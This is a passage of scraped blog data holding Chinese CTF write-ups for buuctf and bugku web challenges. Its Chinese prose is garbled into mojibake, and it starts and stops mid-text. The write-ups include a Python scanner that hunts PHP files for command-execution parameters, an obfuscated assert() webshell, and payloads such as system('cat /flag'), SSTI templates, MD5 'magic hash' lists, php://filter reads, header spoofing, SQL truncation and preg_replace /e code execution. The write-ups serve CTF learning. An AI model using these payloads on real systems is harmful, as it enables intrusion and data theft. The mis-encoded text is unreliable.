in gets: req = session.get(url+'?%s='%a+&quot;echo 'xxxxxx';&quot;) content = req.text req.close() # å…³é—­è¯·æ±‚ é‡Šæ”¾å†…å­˜ if &quot;xxxxxx&quot; in content: flag = 1 break if flag != 1: for b in posts: req = session.post(url, data={b:&quot;echo 'xxxxxx';&quot;}) content = req.text req.close() # å…³é—­è¯·æ±‚ é‡Šæ”¾å†…å­˜ if &quot;xxxxxx&quot; in content: break if flag == 1: #flagç”¨æ¥åˆ¤æ–­å‚æ•°æ˜¯GETè¿˜æ˜¯POSTï¼Œå¦‚æœæ˜¯GETï¼Œflag==1ï¼Œåˆ™bæœªå®šä¹‰ï¼›å¦‚æœæ˜¯POSTï¼Œflagä¸º0ï¼Œ param = a else: param = b print('æ‰¾åˆ°äº†åˆ©ç”¨æ–‡ä»¶ï¼š '+file+&quot; and æ‰¾åˆ°äº†åˆ©ç”¨çš„å‚æ•°ï¼š%s&quot; %param) print('ç»“æŸæ—¶é—´ï¼š ' + time.asctime(time.localtime(time.time()))) s1.release()for i in files: #åŠ å…¥å¤šçº¿ç¨‹ t = threading.Thread(target=get_content, args=(i,)) t.start() ä½œä¸ºä¸€ä¸ªèœé¸¡ï¼Œæˆ‘è§‰å¾—ä»æœ€ç®€å•çš„å¼€å§‹å†™èµ·,å¸Œæœ›èƒ½å­¦åˆ°ç‚¹ä¸œè¥¿: 123456import osimport requestsfilePath=r&quot;C:\\Users\\10452\\Desktop\\src&quot;files = os.listdir(filePath)print(len(files))#3002 æ‰€ä»¥ä¸€å…±æœ‰3002ä¸ªæ–‡ä»¶ 12345with open(file,encoding='utf-8') as f:#è¿™ä¸ªæ˜¯æ‰“å¼€æ–‡ä»¶çš„æ–¹å¼ gets=list(re.findall('\\$_GET\\[\\'(.*?)\\'\\]', f.read())) posts = list(re.findall('\\$_POST\\[\\'(.*?)\\'\\]', f.read())) #ä¸¤ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œç”¨æ¥åŒ¹é…GETå’ŒPOSTï¼Œè¿™é‡Œå¯ä»¥å­¦ä¹ ä¸€ä¸‹å…¶ä¹¦å†™æ–¹å¼: #è¿™é‡Œçš„åæ–œæ éƒ½æ˜¯ä¸ºäº†é¿å…æ­§ä¹‰çš„ï¼Œå±è”½æ‰åœ¨pythonæ­£åˆ™è¡¨è¾¾å¼ä¸­åŸæœ¬çš„åŠŸèƒ½ 12with openï¼ˆ'è·¯å¾„','r'ï¼‰as f: print(f.read())#æ‰“å¼€æ–‡ä»¶å¹¶è¯»å– è¿™é‡Œå°è¯•ä¸€ä¸‹: 1234567import osfilePath=r&quot;C:\\Users\\10452\\Desktop\\src&quot;files = os.listdir(filePath)file=filePath+&quot;\\\\&quot;+files[0]print(file)with open(file,encoding=&quot;utf-8&quot;) as f: print(f.read()) æ­£åˆ™ re.findall çš„ç®€å•ç”¨æ³•ï¼ˆè¿”å›stringä¸­æ‰€æœ‰ä¸patternç›¸åŒ¹é…çš„å…¨éƒ¨å­—ä¸²ï¼Œè¿”å›å½¢å¼ä¸ºæ•°ç»„ï¼‰è¯­æ³•ï¼š 1234//re.findall(pattern, string, flags = 0 )import rea=&quot;asdasd&quot;print(re.findall(&quot;asd&quot;,a)) è®¾ç½®çº¿ç¨‹ 1234import threadings1=threading.Semaphore(100) requests.adapters.DEFAULT_RETRIES = 5s1.acquire() semaphoreå­¦ä¹ :https://my.oschina.net/u/3524921/blog/920303 æ²¡å­¦è¿‡ä¹Ÿå°±è¿™å‡ ä¸ªäº†ï¼Œæ¥ä¸‹æ¥ä¸Šæ‰‹å¤å†™ä¸€ä¸‹:æ„Ÿå—ä¸€ä¸‹å¤§ä½¬çš„ä»£ç ï¼Œpythonè¿˜æ˜¯éœ€è¦ç»§ç»­å­¦ä¹ ï¼ æœ‰ä¸ªæ§½ç‚¹:è¿™é‡Œçš„systemé’ˆå¯¹çš„æ˜¯linuxç³»ç»Ÿå†…çš„echo æ‰€ä»¥éœ€è¦æ›´æ¢ä¸€ä¸‹ è¿™é‡Œæ˜¯payload 1/xk0SzyKwfzw.php?Efa5BVG=cat /flag","link":"/2021/03/28/buuctf4/"},{"title":"bugku2","text":"web221&lt;?php $poc=&quot;a#s#s#e#r#t&quot;; $poc_1=explode(&quot;#&quot;,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt; è¿™ä¸ªexplode(â€œaâ€,$b),ä»¥aä¸ºåˆ†éš”ï¼Œå°†båˆ†å‰²æˆä¸€ä¸ªä¸ªæ•°ç»„ è¿˜æ˜¯æ¯”è¾ƒæ— è¯­çš„ï¼Œè¿™æ®µè¯ç¿»è¯‘è¿‡æ¥å°±æ˜¯: 123&lt;?phpassert($_GET['s']);?&gt; æ¥ä¸‹æ¥è®©æˆ‘ä»¬åº·åº·è¿™ä¸ªassert()å‡½æ•°æ˜¯å¹²å•¥çš„ assert($assertion) â€” æ£€æŸ¥ä¸€ä¸ªæ–­è¨€æ˜¯å¦ä¸º FALSEæœ‰ä¸€ç‚¹å’Œevalå‡½æ•°å¾ˆåƒå®ƒå¦‚æœ assertion æ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šè¢« assert() å½“åš PHP ä»£ç æ¥æ‰§è¡Œã€‚https://www.smi1e.top/%E6%B5%85%E8%B0%88eval%E5%92%8Cassert/ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥æ„é€ payload:?s=æŒ‡ä»¤ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±åº·åº·æœ‰ä»€ä¹ˆæ˜¯å¯ä»¥æŸ¥çœ‹ç›®å½•ä¸‹æ–‡ä»¶çš„æŒ‡ä»¤è·å–æ›´å¤šä¿¡æ¯å§ 1.scandir() åˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸­çš„æ–‡ä»¶å’Œç›®å½•è¿™æ˜¯ä¸€ä¸ªarrayï¼Œæ‰€ä»¥è¦è¾“å‡ºéœ€è¦ç”¨print_r2.ç›´æ¥ä½¿ç”¨systemæŒ‡ä»¤:system(ls)system(dir)çœ‹åˆ°æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œç›´æ¥æ‰“å¼€å°±è¡Œ web18åˆè¦å†™äº²çˆ±çš„è„šæœ¬äº† 1234567891011import requestss = requests.session()//å»ºç«‹è¿æ¥url='http://114.67.246.176:11655/'headers = s.get(url).headersreq = s.get(url)//getæ•°æ®a = req.text[req.text.find('about')+5:req.text.find('=?')]//æˆªå–ç®—å¼print(a)//æˆ‘çš„è°ƒè¯•aa = eval(a)//eval()å‡½æ•°å’ŒPHPçš„ç±»ä¼¼ï¼Œå¯ä»¥ç›´æ¥å°†å…¶ä¸­çš„å½“åšä»£ç è¿è¡Œï¼Œæ‰€ä»¥ç›´æ¥å°†ç®—å¼å¾—å‡ºd = {'value':aa}//è®©postçš„å€¼ä¸ºaareq = s.post(url,data=d)print(req.text) å¯èƒ½è¦å¤šè¿è¡Œå‡ æ¬¡ï¼Œåº”è¯¥è¿™ä¸ªæ•°å¤ªå¤§äº†ç„¶åå°±å¯ä»¥äº† web23è¿™é¢˜æ˜¯æœ‰ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ 123456 &lt;?php highlight_file('2.php');$key='flag{********************************}';$IM= preg_match(&quot;/key.*key.{4,7}key:\\/.\\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);if( $IM ){ die('key is: '.$key);}?&gt; ä¹Ÿå°±æ˜¯ä»æˆ‘ä»¬è¾“å…¥çš„idå½“ä¸­ï¼Œæ»¡è¶³é‚£ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ‰è¡Œå°†æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œæ‹†åˆ†: æ­£åˆ™è¡¨è¾¾å­¦ä¹ key:åŒ¹é…keyå­—ç¬¦.*:ç‚¹æ˜¯åŒ¹é…é™¤äº†æ¢è¡Œç¬¦ä»¥å¤–çš„ä»»æ„å­—ç¬¦,åŠ äº†æ˜Ÿå·è¡¨ç¤ºåŒ¹é…å¤šä¸ªæ­£åˆ™è¡¨è¾¾å¼keyï¼šå†åŒ¹é…ä¸€æ¬¡keyï¼Œ.{4,7}:åŒ¹é…4-7æ¬¡çš„ä»»æ„å­—ç¬¦ï¼ˆé™¤æ¢è¡Œç¬¦ï¼‰keyï¼šå†åŒ¹é…ä¸€æ¬¡keyåŒ¹é…æ™®é€šå­—ç¬¦:/ï¼šåŒ¹é…ä¸€æ¬¡/.:åœ¨ä»»æ„åŒ¹é…ä¸€ä¸ªå­—ç¬¦/ï¼šåœ¨åŒ¹é…ä¸€æ¬¡/(.*keyï¼‰åŒä¸ŠåŒ¹é…ï¼Œ()åªæ”¹å˜é€»è¾‘é¡ºåº[a-z]åŒ¹é…a-zä»»æ„ä¸€ä¸ªå­—ç¬¦[:punct:]:ç‰¹æ®Šå­—ç¬¦ï¼Œåœ¨åŠ ä¸€ä¸ªä¸­æ‹¬å·ï¼Œå°±æ˜¯åœ¨ç‰¹æ®Šå­—ç¬¦ä¸­å»ä¸€ä¸ªæ ¹æ®ä»¥ä¸Š:keyakeyaaaaakey:/a/akeyb@ç„¶åå°±å¯ä»¥è·å¾—flag web24æŸ¥çœ‹é¡µé¢æºç ï¼Œå‘ç°æœ‰ä¸ªcode.txtï¼Œç‚¹è¿›å»ï¼Œå³å¯çœ‹åˆ°æºç : 123456789101112&lt;?phpif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3'])){ $v1 = $_GET['v1']; $v2 = $_GET['v2']; $v3 = $_GET['v3']; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2)){ if(!strcmp($v3, $flag)){ echo $flag; } }}?&gt; å¯ä»¥çŸ¥é“ä»–éœ€è¦æˆ‘ä»¬ä¼ å…¥3ä¸ªå€¼ ä¸”v1=v2 v3ä¸ç­‰äºflagã€‚æŸ¥è¯¢å¯ä»¥çŸ¥é“ï¼Œå¦‚æœä¸¤ä¸ªç±»å‹ä¸ä¸€æ ·ä¹Ÿä¼šç›´æ¥è¿”å›0ï¼Œflagæ˜¯å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ ä¸€ä¸ªå­—ç¬¦æ•°ç»„ï¼Œæ‰€ä»¥payloadä¸º: 1?v1=QNKCDZO&amp;v2=240610708&amp;v3[]=f web25æ ¹æ®æç¤ºï¼Œè¿™é¢˜éœ€è¦çš„æ˜¯hint:sqlçº¦æŸæ”»å‡»ï¼Œå­¦ä¹ äº†ä¸€ä¸‹ä»€ä¹ˆæ˜¯sqlçº¦æŸæ”»å‡»:å‚è€ƒ:https://www.freebuf.com/articles/web/124537.htmlæ€»ç»“ä¸€ä¸‹å°±æ˜¯ï¼Œåœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSQLæ‰§è¡Œæ“ä½œæ—¶ï¼Œä¼šå°†æŸ¥è¯¢å­—ç¬¦ä¸²æœ«å°¾çš„ç©ºæ ¼ä¸€å¹¶åˆ é™¤ï¼Œç‰¹æ®Šæƒ…å†µçœ‹ä»¥ä¸Šåšå®¢å½“æˆ‘ä»¬æ’å…¥ä¸€ä¸ªæ–°æ•°æ®ï¼Œadminï¼ˆå¾ˆå¤šç©ºæ ¼ï¼‰1ï¼Œä½†æ˜¯æ•°æ®åº“æœ‰æ’å…¥é•¿åº¦é™åˆ¶ï¼Œæ¯”å¦‚è¯´æ˜¯10ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ’å…¥çš„è¿™ä¸ªæ•°æ®10ä½ä»¥åçš„æ•°æ®å°†è¢«èˆå¼ƒï¼Œå˜æˆadmin(5ä¸ªç©ºæ ¼)ï¼Œæ¥ä¸‹æ¥æ‰§è¡ŒselectæŸ¥è¯¢çš„æ—¶å€™ï¼Œè¿™ä¸ªäº”ä¸ªç©ºæ ¼åˆä¼šè¢«è‡ªåŠ¨å¿½ç•¥ï¼ŒæŸ¥è¯¢çš„å°±æ˜¯adminäº† åœ¨æœ¬é¢˜ä¸­ï¼šæˆ‘å…ˆæ³¨å†Œäº†ä¸€ä¸ªadmin(+3ä¸ªç©ºæ ¼)1çš„è´¦å·ï¼Œå‘ç°åé¢çš„1æ²¡æœ‰è¢«çº¦æŸæ‰ï¼Œæ‰€ä»¥ç»§ç»­å¢åŠ ç©ºæ ¼æ•°é‡ï¼Œæ³¨å†Œåè¾“å…¥adminä»¥åŠæˆ‘ä»¬åˆšè®¾çš„æ–°å¯†ç ï¼Œå³å¯ç™»å½•ç®¡ç†å‘˜å¸å· web26Referer: https://www.google.com web27å¥½åƒæ˜¯ç¼ºå°‘äº†æºç :QNKCDZOçš„MD5åŠ å¯†ï¼š0e830400451993494058024219903391è®©æˆ‘ä»¬getä¸€ä¸ªaï¼› MD5ç¢°æ’ctfä¸­md5å¸¸è§ç»•è¿‡å­—ç¬¦ä¸²0e:PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 æ•°ç»„ç»•è¿‡å½“md5æ¥å—çš„å‚æ•°ä¸ºæ•°ç»„æ—¶ï¼Œå…¶å€¼éƒ½ä¸º0ï¼Œæ‰€ä»¥æ„é€ payload: 1?a[]=1&amp;b[]=2 çœŸå®ç¢°æ’ä½¿ç”¨MD5å¿«é€Ÿç¢°æ’è½¯ä»¶ https://muouim.github.io/2019/01/30/MD5%E7%A2%B0%E6%92%9E/å‚è€ƒé“¾æ¥ web28XFFä¼ªé€ è·Ÿå‰é¢æœ‰ä¸€é¢˜æ˜¯ä¸€æ ·çš„payloadï¼šburpæŠ“åŒ…ï¼Œç„¶åæ·»åŠ ï¼ŒX-Forwarded-For:127.0.0.1 web29è¿™ä¸€å…³æœ‰æºç ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹æºç äº†:idå°±æ˜¯è¾“å…¥marginç„¶åå› ä¸ºå“ˆå¸Œä¸€æ ·ï¼Œè¿™é‡Œå°±å°è¯•ä¸€ä¸‹ä½¿ç”¨æ•°ç»„ç»•è¿‡äº†ï¼Œå¯ä»¥æˆåŠŸä¸è¿‡æœ‰ä¸ªå€¼è¦ç”¨post å‘é€æ•°æ® web30ï¼šæç¤ºè¯´txtï¼Œæ‰“å¼€ä»¥åå‡ºç°æºç  123456789101112131415&lt;?phpextract($_GET);if (!empty($ac)){$f = trim(file_get_contents($fn));if ($ac === $f){echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;;}else{echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;;}}?&gt; ç”¨äº†ä¸€ä¸ªfile_get_contentså‡½æ•°ï¼Œæ„æ€æ˜¯ä»æ–‡æœ¬ä¸­è·å–å€¼ï¼Œå“ªæ¥çš„æ–‡æœ¬å‘¢ï¼Ÿæƒ³èµ·æ¥æç¤ºè¯´txtæ–‡ä»¶ï¼Œé‚£æ–‡ä»¶åæ˜¯å•¥ï¼Œçœ‹äº†ä¸€ä¸‹æç¤ºï¼Œè¯´æ˜¯flag.txtï¼ˆæœç„¶çŒœå°±æ˜¯ç¥ï¼‰ï¼Œé‚£å°±ç›´æ¥ä½†æ˜¯ä¼¼ä¹æ˜¯ï¼Œacå’Œfnçš„å€¼éƒ½æ˜¯è¦æˆ‘ä»¬ä¼ çš„ï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•:é¦–å…ˆä»‹ç»ä¸€ä¸‹ï¼šæ–¹æ³•ä¸€**:ä½¿ç”¨ç°æˆæ–‡ä»¶**file_get_contents ( string $filename , bool $use_include_path = false , resource $context = ? , int $offset = -1 , int $maxlen = ? ) : string è¿™ä¸ªfilnameæ˜¯æŒ‡æ–‡ä»¶åç§°ï¼šï¼Œä¹Ÿå°±è¯´è¿™è¾¹ç›´æ¥è¾“å…¥æ–‡ä»¶åå°±å¯ä»¥å°†æ–‡ä»¶å†…å®¹ä»¥å­—ç¬¦ä¸²çš„å½¢å¼ä¼ å…¥å˜é‡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥æ„é€ payload:?ac=bugku&amp;filename=flag.txt æ–¹æ³•äºŒï¼šç”¨php://inputæ„é€ æ–‡ä»¶ å°±è¡Œäº†","link":"/2021/01/30/bugku2/"},{"title":"buuctf6","text":"[BJDCTF2020]The mystery of ipç®—æ˜¯ä¸€é“æ¯”è¾ƒæ„å¤–çš„é¢˜ç›®å§ï¼Œå‘ç°X-Forwarded-Forçš„å†…å®¹ä¼šè¢«æ˜¾ç¤ºï¼Œæƒ³è¯´ä¼šä¸ä¼šæ˜¯å‘½ä»¤æ³¨å…¥å°è¯•äº†ä¸€ä¸‹å‘ç°è¢«åŸæ ·è¾“å‡ºäº†ï¼Œæ¥ä¸‹æ¥å°±æ²¡æœ‰å…¶ä»–æ€è·¯äº†çœ‹äº†ä¸€ä¸‹wpï¼Œå‘ç°æ˜¯sstiæ³¨å…¥ï¼Œä½†æ˜¯è·Ÿä»¥å‰åˆä¸åŒï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥ä½¿ç”¨ç³»ç»Ÿå‘½ä»¤,æ‰€ä»¥æ˜¯phpæ¨¡æ¿æ³¨å…¥ï¼ paylaod: 12{{system('ls')}}{{system('cat /flag')}} [BJDCTF2020]Mark loves catgitæ³„éœ²ï¼Œæ‰«ä¸€æ³¢æ‹¿åˆ°æºç  123456789101112131415161718192021222324252627282930313233&lt;?phpinclude 'flag.php';$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = 'yds'; foreach($_POST as $x =&gt; $y){// $$x = $y;//è®©xçš„é”®å=$y eg:$yds='dog'ä¼ å…¥yds=isæ‰€ä»¥æ­¤æ—¶ x=yds=dog å˜æˆx=yds=isæ‰€ä»¥ï¼Œå…¶å®postæ˜¯æ²¡æœ‰ç”¨çš„ï¼Œå› ä¸ºä¼ å…¥çš„é”®ååªä¼šä½œä¸ºä¸€ä¸ªå€¼èµ‹ç»™xçš„é”®å€¼çš„é”®å€¼}foreach($_GET as $x =&gt; $y){// $$x = $$y;//å¯¹äºgetå‚æ•°: ç›´æ¥äº’æ¢ï¼Œæ¯”å¦‚è¯´x=yds=dog y=is=cat é‚£ä¹ˆæ­¤æ—¶ yds=cat}foreach($_GET as $x =&gt; $y){ if($_GET['flag'] === $x &amp;&amp; $x !== 'flag'){//geté”®åä¸ºflagçš„å€¼å’Œxçš„å€¼ç›¸ç­‰ ä½†æ˜¯xçš„å€¼ä¹Ÿå³é”®åä¸ç­‰flagï¼ŸçœŸçš„ç»•ï¼Œç¬‘æ­»æ ¹æœ¬è¿›ä¸å» exit($handsome); }}if(!isset($_GET['flag']) &amp;&amp; !isset($_POST['flag'])){//geté”®åä¸ºflagçš„å€¼ä¸ºç©ºä¸”postflagçš„å€¼ä¸ºç©ºï¼Œé‚£ä¹ˆå°±ä¼šè¿›æ¥ exit($yds);}//postflagçš„å€¼ç­‰äºflagæˆ–è€…getflagçš„å€¼ç­‰äºflagif($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){ exit($is);}echo &quot;the flag is: &quot;.$flag; å®¡è®¡å®¡è®¡~ $$å¯¼è‡´çš„å˜é‡è¦†ç›–é—®é¢˜1.$$ä»‹ç» $$è¿™ç§å†™æ³•ç§°ä¸ºå¯å˜å˜é‡ ä¸€ä¸ªå¯å˜å˜é‡è·å–äº†ä¸€ä¸ªæ™®é€šå˜é‡çš„å€¼ä½œä¸ºè¿™ä¸ªå¯å˜å˜é‡çš„å˜é‡åã€‚ 1234&lt;?php$a=&quot;hello&quot;;$$a='world';//æ­¤æ—¶$hello=&quot;world&quot;;echo &quot;$a ${$a}&quot;;//ç›¸å½“äº$aè¢«è§£æï¼ˆè¢«æ‰§è¡Œä¸ºworldï¼‰ 2.æ¼æ´äº§ç”Ÿ ä½¿ç”¨foreachæ¥éå†æ•°ç»„ä¸­çš„å€¼ï¼Œç„¶åå†å°†è·å–åˆ°çš„æ•°ç»„é”®åä½œä¸ºå˜é‡ï¼Œæ•°ç»„ä¸­çš„é”®å€¼ä½œä¸ºå˜é‡çš„å€¼ã€‚å› æ­¤å°±äº§ç”Ÿäº†å˜é‡è¦†ç›–æ¼æ´ã€‚ ä¸¾ä¾‹ 123456&lt;?phpforeach ($_GET as $key =&gt; $value) {${$key} = $value;}echo $a;?&gt; getå¾—åˆ°çš„æ•°æ®$keyå’Œ$value,å…³é”®ç¬¬3è¡Œ,${$key}ç”¨getä¼ è¿›æ¥çš„$keyåšä¸ºæ–°çš„å˜é‡,å°†getä¼ è¿›æ¥çš„$valueèµ‹å€¼ç»™å®ƒã€‚ get ?a=1 ç¬¬3è¡Œå›è§£æä¸º$a=1ã€‚å°±é€ æˆäº†å˜é‡è¦†ç›–ã€‚ exit()å‡½æ•°ï¼šåœ¨å‡½æ•°ç»“æŸè„šæœ¬çš„è¿è¡Œæ—¶ä¼šè¾“å‡ºä¸€ä¸ªä¿¡æ¯ åœ¨æ­¤é¢˜ä¸­ï¼Œä¸€å¼€å§‹æˆ‘ä»¥ä¸ºåªè¦ç»•è¿‡é‚£å‡ ä¸ªåˆ¤æ–­ï¼Œæ‰§è¡Œåˆ°echoçš„åˆ¤æ–­å°±è¡Œäº†ï¼Œä½†æ˜¯å…¶å®æ˜¯ä¸è¡Œçš„ï¼Œæˆ‘æ²¡æœ‰æ³¨æ„åˆ°æœŸé—´$flagçš„å€¼æ˜¯å¦ä¼šå‘ç”Ÿæ”¹å˜ï¼Œå› ä¸ºè¿™æ˜¯includeâ€™flag.phpâ€™çš„ï¼Œåœ¨index.phpä¿®æ”¹$flagçš„å€¼ä¹Ÿä¼šè¦†ç›–ä¿®æ”¹flag.phpå½“ä¸­çš„å€¼ï¼Œé‚£ä¹ˆæ­¤æ—¶å°±æœ‰ä¸¤ç§æ€è·¯ï¼š 1.ç»•è¿‡ä¸¤ä¸ªåˆ¤æ–­ä½†æ˜¯ä¸æ”¹å˜æœ€ç»ˆechoé‡Œé¢$flagçš„å€¼(å¤±è´¥~)2.è¿›å…¥åˆ¤æ–­ï¼Œè®©åˆ¤æ–­ä¸­exitçš„å˜é‡ç­‰äºflagçš„å€¼: è¿™é‡Œéœ€è¦å…ˆäº†è§£ä¸€ä¸‹ä»£ç çš„æ‰§è¡Œè¿‡ç¨‹ï¼š å¯ä»¥çœ‹åˆ°xä¸ºé”®åï¼Œyä¸ºé”®å€¼ï¼Œå¼„æ¸…æ¥šè¿™ä¸ªï¼Œå¼€å§‹æ­£å¼æ„é€ payloadï¼Œå…ˆä»£ç åˆ†æä¸€æ³¢ï¼š ææ¸…æ¥šè¿™ä¸ªç»§ç»­å¾€ä¸‹ æ–¹æ³•ä¸€ï¼šä»exit(yds)å…¥æ‰‹è¯•è¯•ï¼šè¿™é‡Œå°±å¾ˆç®€å•äº†ï¼Œç›´æ¥ç”¨getç±»å‹çš„ä¼ å…¥ä¸€ä¸ªyds=flag æ–¹æ³•äºŒï¼š1is=flag&amp;flag=flag [BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤1?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=next.php è€ƒå¯Ÿä¼ªåè®®ï¼Œä½¿ç”¨inpuä¼ å…¥I have a dreamç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤æ–­ è¿›å…¥æ–‡ä»¶åŒ…å«ï¼Œæ­¤æ—¶è¿‡æ»¤flag.php ä½†æ˜¯åˆæ— æ³•ä½¿ç”¨dataåè®®çœ‹åˆ°æç¤ºnext.phpï¼Œäºæ˜¯ä½¿ç”¨filteråè®®æ‰“å¼€: 123456789101112131415161718192021&lt;?php$id = $_GET['id'];$_SESSION['id'] = $id;function complex($re, $str) { return preg_replace( '/(' . $re . ')/ei', 'strtolower(&quot;\\\\1&quot;)', $str );+}foreach($_GET as $re =&gt; $str) { echo complex($re, $str). &quot;\\n&quot;;}function getFlag(){ @eval($_GET['cmd']);} åˆ°äº†è¿™é‡Œå°±æ˜¯åªæ˜¯ç›²åŒºäº†ï¼Œä¸€ç›´åœ¨æƒ³å¦‚ä½•å¼•ç”¨getFlagè¿™ä¸ªå‡½æ•°ï¼Œä½†ä¸»è¦æ˜¯æ­£åˆ™è¡¨è¾¾å¼æ²¡è¯»æ‡‚ï¼Œ preg_replaceå‡½æ•°ä¹‹å‘½ä»¤æ‰§è¡Œ preg_replaceï¼š(PHP 5.5) åŠŸèƒ½ ï¼š å‡½æ•°æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢ å®šä¹‰ ï¼š mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) æœç´¢ subject ä¸­åŒ¹é… pattern çš„éƒ¨åˆ†ï¼Œ å¦‚æœåŒ¹é…æˆåŠŸä»¥ replacement è¿›è¡Œæ›¿æ¢ $pattern å­˜åœ¨ /e æ¨¡å¼ä¿®æ­£ç¬¦ï¼Œå…è®¸ä»£ç æ‰§è¡Œ /e æ¨¡å¼ä¿®æ­£ç¬¦ï¼Œä½¿preg_reslace() å°† $replacement å½“åšphpä»£ç æ¥æ‰§è¡Œ æ¼æ´è§£æï¼šè¿™é“é¢˜ç›®è€ƒå¯Ÿçš„æ˜¯ preg_replace å‡½æ•°ä½¿ç”¨ /e æ¨¡å¼ï¼Œå¯¼è‡´ä»£ç æ‰§è¡Œçš„é—®é¢˜ã€‚æˆ‘ä»¬å‘ç°åœ¨ä¸Šå›¾ä»£ç  ç¬¬11è¡Œ å¤„ï¼Œå°† GET è¯·æ±‚æ–¹å¼ä¼ æ¥çš„å‚æ•°ç”¨åœ¨äº† complexStrtolower å‡½æ•°ä¸­ï¼Œè€Œå˜é‡ $regex å’Œ $value åˆç”¨åœ¨äº†å­˜åœ¨ä»£ç æ‰§è¡Œæ¨¡å¼çš„ preg_replace å‡½æ•°ä¸­ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶ preg_replace å‡½æ•°ç¬¬1ä¸ªã€ç¬¬3ä¸ªå‚æ•°ï¼Œæ¥æ‰§è¡Œä»£ç ã€‚ä½†æ˜¯å¯è¢«å½“åšä»£ç æ‰§è¡Œçš„ç¬¬2ä¸ªå‚æ•°ï¼Œå´å›ºå®šä¸º â€˜strtolower(â€œ\\\\1â€)â€™ ã€‚ 12345åå‘å¼•ç”¨å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼ **ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å·** å°†å¯¼è‡´ç›¸å…³ **åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒº** ä¸­ï¼Œæ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä» 1 å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨ 99 ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨ '\\n' è®¿é—®ï¼Œå…¶ä¸­ n ä¸ºä¸€ä¸ªæ 